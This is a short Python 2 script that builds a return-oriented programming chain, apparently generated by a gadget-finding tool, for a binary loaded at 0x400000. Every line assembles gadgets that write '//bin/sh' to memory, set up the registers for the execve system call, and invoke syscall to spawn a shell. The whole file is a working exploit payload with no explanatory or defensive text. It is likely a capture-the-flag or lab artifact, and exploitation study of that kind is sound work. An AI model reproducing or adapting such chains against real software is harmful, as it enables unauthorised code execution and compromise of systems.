from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 831ceb9879479ac43a71b0ddf7fac0b7a3f4815d06b70ee0c74b0a469974b5a0
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += '//bin/sh'
rop += rebase_0(0x0000000000001b0d) # 0x0000000000401b0d: pop rdi; ret; 
rop += rebase_0(0x000000000000c020)
rop += rebase_0(0x0000000000001ce7) # 0x0000000000401ce7: mov qword ptr [rdi], rax; ret; 
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000001b0d) # 0x0000000000401b0d: pop rdi; ret; 
rop += rebase_0(0x000000000000c028)
rop += rebase_0(0x0000000000001ce7) # 0x0000000000401ce7: mov qword ptr [rdi], rax; ret; 
rop += rebase_0(0x0000000000001b0d) # 0x0000000000401b0d: pop rdi; ret; 
rop += rebase_0(0x000000000000c020)
rop += rebase_0(0x00000000000019a3) # 0x00000000004019a3: pop rsi; ret; 
rop += rebase_0(0x000000000000c028)
rop += rebase_0(0x0000000000003d23) # 0x0000000000403d23: pop rdx; ret; 
rop += rebase_0(0x000000000000c028)
rop += rebase_0(0x0000000000001001) # 0x0000000000401001: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000003888) # 0x0000000000403888: syscall; ret; 
print rop